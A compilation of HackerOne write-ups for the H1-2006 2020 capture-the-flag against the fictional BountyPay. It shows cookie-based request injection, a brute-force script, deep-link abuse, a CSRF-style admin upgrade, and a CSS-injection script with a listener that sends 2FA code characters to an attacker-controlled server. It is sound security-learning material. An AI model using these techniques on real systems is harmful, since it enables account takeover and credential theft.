{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
``` 

Manipulating the `hash` value invalidates the session, but we can use arbitrary values for `account_id`, e.g.:

```
{"account_id":"xyz","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

The `account_id` value is used as part of the API url that gets returned when issuing a GET request to `/statements?month=[month]&year=[year]`. As the URL fragment gets ignored server-side, it is possible to terminate the URL with `#` after the user ID. It is possible to make calls to arbitrary endpoints that cannot be accessed directly by injecting data in the `account_id` field, e.g. retrieving user information instead of the transactions:

```
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 06 Jun 2020 12:46:14 GMT
Content-Type: application/json
Connection: close
Content-Length: 205

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK#\/statements?month=01&year=2020","data":"{\"account_id\":\"F8gHiqSdpK\",\"owner\":\"Mr Brian Oliver\",\"company\":\"BountyPay Demo \"}"}
```

Base64-decoded cookie value: 

```
{"account_id":"F8gHiqSdpK#","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

### 4. Open redirect on api.bountypay.h1ctf.com => APK download

When accessing `https://api.bountypay.h1ctf.com` directly, I discovered a redirect which only works for the following whitelisted URLs:

* `https://www.google.com/search?q=*`, which redirects to google. I first tried to use one of Google's redirector endpoints in order to redirect via google to a host under my control, which could be used to perform another redirect to arbitrary targets, effectively bypassing the whitelist check, but I did not succeed because of a single character (`?`).
* `https://software.bountypay.h1ctf.com/` seems to be in the whitelist, but is not accessible from the externally - after being redirected I got an nginx error message:

{F858472}

All other domains aren't on the whitelist, the response contains the error message `URL NOT FOUND IN WHITELIST` or `URL must begin with either http:// or https://`.

However, visiting `https://software.bountypay.h1ctf.com/` via the API seems to work with the following base64-decoded cookie value:

```
{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

The site seems to require a login, but only accepts POST requests, which I did not manage to submit via the redirect. After giving up on that, I bruteforced directories using the following script using Seclist's `raft-small-directories.txt` wordlist:

```
import base64
import json
import requests
import sys


def submit(payload):
    url = "https://app.bountypay.h1ctf.com/statements?month=02&year=2019"
    token = { "hash": "de235bffd23df6995ad4e0930baac1a2", "account_id": f"../../redirect?url=https://software.bountypay.h1ctf.com/{payload}#" }
    cookies = { "token": base64.b64encode(json.dumps(token).encode()).decode() }
    res = requests.get(url, cookies=cookies)
    return res


def brute():
    with open("/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt") as f:
        for line in f:
            payload = line.strip()
            res = submit(payload)
            json_data = json.loads(res.text)
            data = json_data.get("data")
            url = json_data.get("url")
            if not "404 Not Found" in data:
                print(f"[+] {url}")
                print(data)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        brute()
    else:
        payload = sys.argv[1]
        res = submit(payload)
        print(res.status_code, res.text)
```

After running the script for a short time, I got a directory listing under `/uploads`:

```
[+] https://api.bountypay.h1ctf.com/api/accounts/../../redirect?url=https://software.bountypay.h1ctf.com/uploads#/statements?month=02&year=2019
<html>
<head><title>Index of /uploads/</title></head>
<body bgcolor="white">
<h1>Index of /uploads/</h1><hr><pre><a href="../">../</a>
<a href="/uploads/BountyPay.apk">BountyPay.apk</a>                                        20-Apr-2020 11:26              4043701
</pre><hr></body>
</html>
```

Downloading the API was possible using `wget https://software.bountypay.h1ctf.com/uploads/BountyPay.apk` directly.

### 5. Android challenges

I decompiled the Android app with `apktool` and `dex2jar` and analyzed the source code in` jadx`.

For interacting with the app I used an Android Studio's AVD manager to spin up an emulator with Android 6. Luckily, the app works under Android 6, this enables loading a Burp certificate and intercept the HTTP(s) traffic generated by the app without troubles. For entering values into text fields I used `adb shell input text [input]` in order to be able to copy-paste values instead of typing them out.

Analyzing the app revealed 3 interesting classes, `PartOneActivity`, `PartTwoActivity` and `PartThreeActivity`. Thoses classes correspond to the levels that need to be solved in order to complete the challenges.

#### PartOneActivity

This challenge was actually pretty simple. When starting the app, this activity gets started straightaway. However, only a blank screen was displayed. When clicking on the BountyPay icon in the bottom right corner, `Hint: Deep Links` showed up.

Reviewing `AndroidManifest.xml` contains the following Intent filter for `PartOneActivity`:

```
<activity android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity" android:theme="@style/AppTheme.NoActionBar">
	<intent-filter android:label="">
		<action android:name="android.intent.action.VIEW"/>
		<category android:name="android.intent.category.DEFAULT"/>
		<category android:name="android.intent.category.BROWSABLE"/>
		<data android:host="part" android:scheme="one"/>
	</intent-filter>
</activity>
```

PartOneActivity processes data from an intent as follows:

```
if (getIntent() != null && getIntent().getData() != null) {
  String str = getIntent().getData().getQueryParameter("start");
  if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
	str = sharedPreferences.getString("USERNAME", "");
	SharedPreferences.Editor editor = sharedPreferences.edit();
	String str1 = sharedPreferences.getString("TWITTERHANDLE", "");
	editor.putString("PARTONE", "COMPLETE").apply();
	logFlagFound(str, str1);
	startActivity(new Intent((Context)this, PartTwoActivity.class));
  } 
} 
```

According to the source code, the URL for starting PartOneActivity via deep link is `one://part?start=PartTwoActivity`.

When using that deep link by hosting an HTML file (see PartThreeActivity) on my machine and accessing it via the emulator's browser, I got redirected to PartTwoActivity as expected.

#### PartTwoActivity

In order to render all components from PartTwoActivity, it needs to be accessed via another deep link URL: `two://part?two=light&switch=on`. The correct values for the query parameters can be found out by reviewing the source code of `PartTwoActivity` in the same manner as for solving `PartOneActivity` and opening the app via link in my self-hosted HTML file (see PartThreeActivity).

After that, a value needs to be entered into the text field. The source code that decides if the input is correct and completes `PartTwoActivity` is:

{F858476}

One needs to enter a value that equals data the gets fetched from Firebase Realtime Database. By intercepting the app's traffic, the required value, `X-Token`, could be found in the websocket requests:

{F858475}

By entering `Token` into the text input field (`X-` gets appended according to the source code), one can complete PartTwoActivity.

#### PartThreeActivity

`PartThreeActivity` needs to be started via deep link like the first two activities using the following parameter values:

* `three`: `base64(PartThreeActivity)`
* `switch`: `base64(on)`
* `header`: `X-Token`

In order to complete that level, it is necessary to submit a hash from the firebase database:

{F858474}

`PartThreeActivity` can also be solved by watching the network traffic:

{F858473}

In another websocket request, I could also see a hostname being transmitted: `http://api.bountypay.h1ctf.com` - this hints where the hash could be used in the next stage...

Complete HTML file that contains deep links for all levels:

```
<!DOCTYPE html>
<html>
<head><title>BountyPay App Exploit Page</title></head>
<body style="text-align: center;">
    <h1><a href="one://part?start=PartTwoActivity">Start PartOneActivity</a></h1>
    <h1><a href="two://part?two=light&amp;switch=on">Start PartTwoActivity</a></h1>
    <h1><a href="three://part?three=UGFydFRocmVlQWN0aXZpdHk%3d&amp;switch=b24%3d&amp;header=X-Token">Start PartThreeActivity</a></h1>
</body>
</html>
```

## Leaked App Token => Creation of staff user account

The leaked hash, `8e9998ee3137ca9ade8f372739f062c1`, can be used as `X-Token` header for `api.bountypay.h1ctf.com` and allows access to the `/api/staff` endpoint, which was not possible before:

Issuing a GET request to `/api/staff` returns the staff IDs of Brian Oliver and Sam Jenkins.

```
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Connection: close
X-Token: 8e9998ee3137ca9ade8f372739f062c1


HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 03 Jun 2020 23:33:27 GMT
Content-Type: application/json
Connection: close
Content-Length: 104

[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
```

Issuing a POST request works as well. After fiddling around with content type and request parameters I found out that a POST request with `Content-Type: application/json` and POST parameter `staff_id` seems to be valid syntaxwise, but returns `["Invalid Staff ID"]` for syntactically correct, but arbitrary staff IDs such as `STF:1111111111` and `["Staff Member already has an account"]` for existing staff IDs such as `STF:84DJKEIP38`.

However, my initial Twitter recon paid off, I remembered a Sandra Allison account following BountyPayHQ with the following post:

{F858477}

The staff ID from the badge seems to work (Sandra probably did not obtain an account for the API yet):

``` 
POST /api/staff HTTP/1.1
Content-Length: 25
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Content-Type: application/x-www-form-urlencoded
Connection: close

staff_id=STF%3a8FJ3KFISL3


HTTP/1.1 201 Created
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 06 Jun 2020 15:05:34 GMT
Content-Type: application/json
Connection: close
Content-Length: 110

{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

### 6. Privilege escalation: Staff user account => Admin access

Logging in with `sandra.allison` and password `s%3D8qB8zEpMnc*xsz7Yp5` works at `https://staff.bountypay.h1ctf.com`.

The logged-in part of the website can be used by staff members for receiving messages from admins. One can see a welcome ticket in the "Support Tickets" section - replies are currently disabled. In the "Profile" section, staff members can change their profile name and choose from one of three avatars.

When trying out all possible actions and looking at requests / responses in BurpSuite, some things caught my attention:

* The website uses templates for displaying content. The template name is submitted via the HTTP GET parameter `template`. I bruteforced additional values for that parameter with `ffuf` and found out that possible values are `login` (which displays the login page), `home` (used for most sections of the login area), `ticket` (used in the tickets section for displaying the welcome message) and `admin` (not accessible with that user - when trying to access it, the error message `No Access to this resource` gets returned).
* When manipulating the request submitted when changing profile data, special characters are stripped from the data, however, it is possible to use blanks. It is possible to use invalid values for the `avatar` parameter, the backend does not refuse to save them. When looking for reflections of the parameters submitted, I noticed that the `avatar` parameter gets reflected on the ticket page as well as on the profile pages in the `class` attribute of an HTML `div` element.
* At the bottom of the page, there is a `Report This Page` link. When clicking on it, a dialog with the following text is displayed:

```
Is there something wrong with this page? If so hit the "Report Now" button and the page will be sent over to our admins to checkout.

Pages in the /admin directory will be ignored for security
```

* There is a custom JavaScript file which handles clicking on different tabs to navigate to different parts of the logged-in part of the website, submission of the "Report This Page" request which can be triggered by clicking on the "Report Now" button in the reporting dialog as well as the submission of an "Upgrade To Admin" function which seems to give users admin privileges.

```
$('.upgradeToAdmin').click(function () {
  let t = $('input[name="username"]').val();
  $.get('/admin/upgrade?username=' + t, function () {
    alert('User Upgraded to Admin')
  })
}),
$('.tab').click(function () {
  return $('.tab').removeClass('active'),
  $(this).addClass('active'),
  $('div.content').addClass('hidden'),
  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),
  !1
}),
$('.sendReport').click(function () {
  $.get('/admin/report?url=' + url, function () {
    alert('Report sent to admin team')
  }),
  $('#myModal').modal('hide')
}),
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));

```

Obviously, the goal is to somehow trigger the "Upgrade To Admin" functionality. As the current user cannot issue that request, an Admin has to be tricked into submitting that request. 

XSS is not possible because all special characters are stripped from user input, therefore, the "Report This Page" functionality must be misused for that.

In order to achieve that, I needed two conditions to be met by the reported page's HTML:

1. There must be an `input` element with the `name` attribute set to `username`, containing the value `sandra.allison`
2. A click on an element with the class `upgradeToAdmin` must be triggered in the background when visiting the manipulated page without any sort of user interaction

The only `input` field meeting the first requirement can be found in the `login` template. When submitting the `username` parameter in the query string, it luckily is set as value in that input field.

As stated before, it is possible to additionally assign arbitrary classes to a `div` element in the ticket and profile view. What if we change a `div` element into a button by adding the `button` class (as well as `btn btn-primary` because the page uses Bootstrap, just to be sure that the `div` is clickable) and the `upgradeToAdmin` class in order to cause a click on that button to submit the "Upgrade to admin" request?

But how to create a click event without user interaction? Luckily, the custom javascript file helps us again here: When adding the URL fragments `tab1`, `tab2` or `tab3` to the URL, a click on the corresponding tab (or any element with the `tabX` class gets triggered in the background. Nice!

The only problem left is that we need at least two different templates to be loaded at the same time in order to put a single page together that chains all that things into a usable exploit. Luckily, that is no problem as well. I found out that it is possible to load multiple templates by submitting an array value for the `template` parameter. However, it took me some time to complete that part of the CTF due to a strange behaviour of the site: I first used `template[0]=x&template[1]=y` for specifying multiple templates, which perfectly works in the browser, but does not have any effect when triggering that via the "Report This Page" functionality. After changing the syntax to `template[]=x&template[]=y`, the same request worked without any changes.

Let's summarize that into an exploit: In order to upgrade privileges, the following steps must be taken:

1. Change profile data with the following request:

```
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Connection: close
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH
Upgrade-Insecure-Requests: 1

profile_name=sandra&profile_avatar=tab3+upgradeToAdmin+btn+btn-primary+button
```

2. Submit the following URL via the "Report This Page" functionality: `/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab3` 

The corresponding request contains that URL in URL-encoded base64 and looks as follows:

```
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjM%3d HTTP/1.1
Host: staff.bountypay.h1ctf.com
Connection: close
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRFYrV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hvSVg2SUJZVlAya2RZa1IvaFJqQTZldmswcmk0WXptV1VFMmZYRUtMU0lteDNtSFlWNVhuNGdmTnJLSUJsNmZ2MVpBK3diZDNTYWZPVlF3QVQwTnI4eFBseFp1V3ZvcWxzVEdjMUpKWUVxRlZVRmU0YWV0Z2N2bGRRemlKUno0UnFrdEE9
```

Et voila, the response contains another cookie:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 07 Jun 2020 17:42:21 GMT
Content-Type: application/json
Connection: close
Set-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRFYrV01aenlqQ2pWU0lGNUlpYkRlOXlZWk1BR0hvSVg2SUJZVlAya2RZa1IvaFJqQTZldmswcmk0WXptV1VFMmZYRUtMU0lteDNtSFlWNVhuNGdmTlZEWXduMEpHVFlBK3diZDNTYWZPVlF3QVQwTnI4eEtseFpMR2dvdjVnVERjd2Raa0QrRkVNU084WEtkNGY3d1JYbFNkU3k0bzRrdEE9; expires=Tue, 07-Jul-2020 17:42:21 GMT; Max-Age=2592000; path=/
Content-Length: 19

["Report received"]
```

After reloading the page using that cookie, an additional tab got added to the page, containing an admin section with passwords for `brian.oliver` and `marten.mickos`!

{F858479}

### 7. 2FA bypass => bounty payout

Considering Brian Oliver's password we retrieved from the staff's Admin page, it looks like the credentials are valid for `https://api.bountypay.h1ctf.com`. As the objective is to help Marten Mickos pay out bounties, it looks like we're very close to the flag. However, there is one additional bypass needed to complete the task...

Logging in with username `marten.mickos` and password `h&H5wy2Lggj*kKn4OD&Ype` succeeds at `https://api.bountypay.h1ctf.com` (when using the MD5 2FA bypass we used for Brian Oliver) as expected. When loading the transactions for May 2020, an open payment is displayed:

{F858480}

However, it's not as simple as clicking on the `Pay` button. There is another 2FA challenge that needs to be completed:

{F858481}

The 2FA cannot be bypassed with the MD5 method from before, that would have been too easy.

When looking at the 2FA flow, I noticed a strange request:

```
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Connection: close
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
Upgrade-Insecure-Requests: 1

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

The `app_style` parameter contains a full URL. I assumed that I might be able to point it to a server under my control and extract information via CSS injection.

Indeed, when pointing it at my server, I noticed requests from a headless chrome. The fact that the request did not seem to come from an application processing stuff but from a browser immediately pointed me towards CSS injection. Indeed - it was possible to make callbacks when a HTML element satisfies certain conditions by forcing the browser to load my own stylesheet that sets the `background:url` to another URL that points to the attacker server on elements using CSS regexes, e.g.:

```
input[name^="code"]{ background:url("https://[attackerserver]:9999/log"); }
```

Great! Luckily, searching for an `input` element starting with a `name` attribute with a value starting with `code` was my first (more or less educated) guess, but it took me some time to figure out the purpose of it. First I thought that it is just a single input field and wasted some time wondering why I did not get any results when querying for the content of the `value` attribute. After correctly guessing the next character, which was an underscore, it came to my mind that there could maybe be multiple `code_*` input fields and indeed: there is `code_1`  to `code_7`, which fits to the HTML `input` field for the challenge answer having a max length of 7. Therefore, I suspected that each input field contains one character of the 2FA code, which indeed was the case.

After knowing the input fields to target, I wrote a small bash script that generates an evil CSS stylesheet for revealing the values of those fields when the victim browser loads it instead of the real CSS:

```bash
#!/bin/bash

for i in {1..7}; do
        for v in {0..9}; do echo "input[name="code_$i"][value="$v"]{ background:url(\"https://[attackerserver]:9999/log_$i/$v\"); }"; done
        for v in {A..Z}; do echo "input[name="code_$i"][value="$v"]{ background:url(\"https://[attackerserver]:9999/log_$i/$v\"); }"; done
        for v in {a..z}; do echo "input[name="code_$i"][value="$v"]{ background:url(\"https://[attackerserver]:9999/log_$i/$v\"); }"; done
done
```

As the browser only seems to load CSS from an SSL website, I wrote a small script for my evil HTTPS Server in Python and placed it on my VPS:


```python
$ cat httpserver.py 
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import logging

evil_css = open("evil.css", "rb").read()

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path == "/css":
            # logging.error(self.headers)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-Type", "text/css")
            self.end_headers()
            self.wfile.write(evil_css)
        else:
            # logging.error(self.headers)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()


httpd = HTTPServer(('0.0.0.0', 9999), SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, 
        keyfile="[redacted]", 
        certfile="[redacted]", server_side=True)
httpd.serve_forever()
```

After running the Python script and pointing the URL in the request to `https://[attackerserver]:9999/css`, the log output of the script looked as follows:

```bash
$ python3 httpserver.py 
3.21.98.146 - - [05/Jun/2020 21:05:12] "GET /css HTTP/1.1" 200 -
3.21.98.146 - - [05/Jun/2020 21:05:12] "GET /log_7/S HTTP/1.1" 200 -
3.21.98.146 - - [05/Jun/2020 21:05:12] "GET /log_1/t HTTP/1.1" 200 -
3.21.98.146 - - [05/Jun/2020 21:05:12] "GET /log_2/K HTTP/1.1" 200 -
3.21.98.146 - - [05/Jun/2020 21:05:13] "GET /log_3/s HTTP/1.1" 200 -
3.21.98.146 - - [05/Jun/2020 21:05:13] "GET /log_4/P HTTP/1.1" 200 -
3.21.98.146 - - [05/Jun/2020 21:05:13] "GET /log_5/v HTTP/1.1" 200 -
3.21.98.146 - - [05/Jun/2020 21:05:13] "GET /log_6/g HTTP/1.1" 200 -
```

Entering `tKsPvgS` as token succeeded - finally, all bounties were paid and the flag got displayed:

{F858483}

## Impact

.

---

### [[H1-2006 2020] I made the CEO's bounty payment!](https://hackerone.com/reports/887816)

- **Report ID:** `887816`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @bugra
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T21:51:19.187Z
- **CVE(s):** -

**Vulnerability Information:**

^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$

I will write the details in comment.

## Impact

I have headache now.

---

### [[H1-2006 2020] CTF Writeup](https://hackerone.com/reports/888939)

- **Report ID:** `888939`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @hipotermia
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T15:29:01.444Z
- **CVE(s):** -

**Vulnerability Information:**

{F851692}
# ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$

I'll try to have the writeup ready in the following days here:
* https://hipotermia.pw/bb/h1-2006-ctf-solution

It will be password protected and I will post a comment here when it is ready.

Thanks for this CTF, I really enjoyed it!

## Impact

-

---

### [[H1-2006 2020]  ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$](https://hackerone.com/reports/888331)

- **Report ID:** `888331`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @pirateducky
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T15:24:52.434Z
- **CVE(s):** -

**Vulnerability Information:**

Still working on the report figured I should turn it in though :D

## Impact

hugeee

---

### [[H1-2006 2020] [Multiple Vulnerability] CTF Writeup - @abdilahrf_](https://hackerone.com/reports/888484)

- **Report ID:** `888484`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @abdilahrf_
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T02:06:41.076Z
- **CVE(s):** -

**Vulnerability Information:**

As there is a private invite for the first 10 solver, i send only the flag now
{F851115}
will complete my writeup on the next comment.

## Impact

Controlling martenmickos account.

**Summary (researcher):**

the writeup also on my personal blog: https://abdilahrf.github.io/ctf/writeup-hackerone-h12006-ctf
you can also check other stuff, i also write my other CTF and BugBounty Findings, cheers.

---

### [[H1-2006 2020] I successfully solved it!](https://hackerone.com/reports/887818)

- **Report ID:** `887818`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @zeroxyele
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T01:04:08.535Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,
I'll get post there the write-up soon. Here is flag: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`

Sincerely,
@zeroxyele

## Impact

null

**Summary (researcher):**

Update: After recent markdown changes on HackerOne, attachments/images were broken. So I had to comment the writeup, you can read it down below.

---

### [[h1-2006 2020] Write up for H1-2006 CTF](https://hackerone.com/reports/895772)

- **Report ID:** `895772`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @zer0ttl
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T00:26:03.469Z
- **CVE(s):** -

**Vulnerability Information:**

I huffed and puffed my way up a flight of stairs into a dimly lit, dusty room, looking for Sherlock. As I made way through scattered books, I exclaimed, "Sherlock, wake up! It’s that time of the year. h1-ctf, a chance to get an invitation to hackerone’s live hacking event. “zer0ttl, of course! Your excitement is inversely proportional to the number of times you were invited to the event,” scoffed Sherlock sarcastically.

Though what he said was true, I assured that this time it was different. I had been learning and getting better over the last year. I was more confident that this time I will be able to complete it.

I continued, “So, I came across this tweet saying that h1-ctf is live. I doubted if I was good enough to try for it. Then Hacker0x01 tweeted that they are extending the CTF through June 10, 2020. It was June 5 already.”

Nodding his head in pity, Sherlock said, “You think now is the time to give this thing a try? Good job zer0ttl! Better luck next time! People have been at this for days now and what makes you think you can get this?” 

I was adamant, “Come on. It’s the weekend amidst a pandemic. It’s not like you have other cases to handle. Your ‘art of deduction’ and my ‘technical’ skills can help us pull this off together.”

And then I heard the golden words! “Ok then, zer0ttl, you asked for it. Here goes nothing! What do we have till now?”

Now, that I finally had Sherlock onboard, I put out all my cards on the table. “Awesome. We make a great team. So, this guy @martenmickos needs to approve May bug bounty payments but he has lost his login details for BountyPay. We have to help him retrieve the creds.” 

A visibly disgruntled, Sherlock said, “Of course, we have to do the job for a clumsy person.”

{F863050}

“The link in the tweet https://hackerone.com/h1-ctf gives us our in-scope targets. It seems to be a wild card domain. I always get excited about wildcards,” I almost shrieked.

{F863051}

Starting to get intrigued, Sherlock shared, “You know what to do zer0ttl. The usual suspects. Start with the asset discovery. What do you use for that?”. “I use amass. It performs mapping of attack surfaces and external asset discovery using open source information gathering.”

I started the enumeration using amass. While waiting for the results I couldn’t help but notice the low wifi reception. “Mrs Hudson needs to upgrade wifi here. It is painfully slow.”

Almost like it made no difference, Sherlock said, “Oh yeah, regarding that. You see those boxes in that corner. Those are the new access points. They have been there for a month now. I am just not motivated enough to install them.” 

I glanced at the direction Sherlock was pointing at. I could not believe my eyes. This man has a stock of new access points waiting to be installed. I was about to lash out at Sherlock, but my attention was diverted by the output on my laptop screen. The amass tool returned some results.

{F863054}

“I got some domains back. Sweet! I will check what is hosted on each of these websites. So, domains bountypay.h1ctf.com, www.bountypay.h1ctf.com point to the same application.”

{F863055}

“The login dropdown on the top right of the screen has two links. Customers points to https://app.bountypay.h1ctf.com/ and staff points to https://staff.bountypay.h1ctf.com/,” I continued. The wappalyzer extension says that this looks like a application that uses  jquery 1.12.4, bootstrap framework.”

{F863057}

 I was looking at the source of the page. There was a twitter account at the bottom of the page – bountypayhq. “Hmm, the company has a twitter account,” I said aloud. “I will look for something in the twitter account. You continue with the other domains,” said Sherlock.

“Let’s have a look at Customers link first. It poitns to [https://app.bountypay.h1ctf.com/](https://app.bountypay.h1ctf.com/). Wappalyzer shows the same for the site.” 

{F863058}

Mocking me, he said, “Try admin/admin or admin/password, it works. It has come in handy many a time. Remember how we locked out Mrs Hudson out of her router.” 

“No, this is h1-ctf. I wish it was this simple,” I nodded, as I disregarded Sherlock’s advice. “Staff points to https://staff.bountypay.h1ctf.com/?template=login which also looks like using jquery.”

{F863059}

“Wait. Try it here,” exclaimed Sherlock. “It’s not that simple Sherlock!”

 “Well, if you don’t try you will never know.”

 I took a deep breath and keyed in ‘admin/admin’. “See it’s not that simple. Invalid Username / Password combination. Happy?”

{F863060}

“Well, atleast you tried. That’s what matters. When will you learn zer0ttl?” he shrugged. “What about the other domain `software.bountypay.h1ctf.com`?”

{F863062}

“It says 401 Unauthorized,” I frowned. “It replies with a 401 for anything I throw at it.”

{F863061}

“Well, aren’t you a cheeky self centered bastard!” he chuckled again. “The last one -`api.bountypay.h1ctf.com`.”

{F863064}

“Wouldn’t the next logical step be to do content discovery on each of the domains? Baby steps zer0ttl!” Sherlock was surprisingly optimistic.

I fired up ffuf for content discovery. “This new tool is blazing fast. This is now my goto tool for content discovery.”

{F863065}

The room was filled with the whirring sound of my laptop fan. “A thousand threads? Well, my room heating is broken. I wonder if your laptop fan would help me fix it,” said Sherlock. I waited patiently for the scan to complete. It took three minutes to run a list with 1.2M words. “Not bad,” I said.

{F863066}

I was rather dissapointed at the results. Nothing interesting popped up. “Well, I won’t be able to complete this. Nothing popped up. People use their own wordlists. I don’t have any. A hacker is only good as his wordlist is. I cannot do this.” 

Sherlock, took in a deep breath and said, “Well, wouldn’t you make a wonderful fortune teller, zer0ttl. Stop jumping to conclusions. If not this, then try another wordlist. In the meantime, I am getting us some coffee. We have a long day ahead. This bed is going to be uncomfortable. Let’s move this to our workspace.

I let out a chuckle and asked,“By workspace you mean that rusty table with a visible layer of dust over it?”
Staring back with a death stare, Sherlock said, “Yes, that 

The workplace in question, is basically a table that has a monitor, a keyboard, a mouse, a half eaten pizza, pizza boxes, bottles, books and papers. It had space for another planet, but none for my laptop. I started ffuf using the raft list this time, set it on the chair that I was sitting on and started cleaning the table. I though to myself, ‘I really want to finish this ctf this time. This would act as a morale booster for me. We should really get a cleaning service here. It’s quite filthy.’

“Well, you missed a spot.”

My chain of thoughts was broken by a rather authoratative voice. That is when I realised – I am the cleaning service!

“Well there seems to be a .git repo left by the developer on app.bountypay.h1ctf.com.” said Sherlock. “I wonder what secerts are hidden in that repo,” sipping on his coffee. I dropped what I was doing and rushed to the laptop. And, indeed there it was, waiting for me. A ‘.git’ had returned a 403 from the list. I grabbed my laptop and hooked it onto the monitor, keyboard and the mouse on the table.

{F863068}

Based on my previous experiences, I was aware about `.git/HEAD` and `.git/config` files inside a git repo. The `HEAD` is like the current branch and configuration about a git repo is stored in `config`. Within the next few seconds, I had sent requests to those endpoints as clockwork. Sometimes the devs mess up their web server config. Leaving these files open in the wild. And they did here too.

{F863072}

{F863071}

“Ah ha, finally!” I exclaimed. “The devs indeed messed up. The `.git/config` file is accessible. It points to a remote origin at https://github.com/bounty-pay-code/request-logger.git I am going to download the repo and check what’s inside that repo.” Sherlock was rather interested in something outside the window. It wasn’t something new. His attention span is worse than that of a cat. I proceeded with the download of the git repo. To my suprise, I was able to download the repo.

{F863070}

I had learnt that whenever anybody commits to git you have to write a message using the ‘-m’ flag. So, I incorporated checking git logs into my methodology. Sometimes devs write descriptive messages which shouldn’t be public.

{F863069}

Well, nothing to see here other than an entry for  `Create logger.php`. Next step is to examine the `logger.php` file.

{F863074}

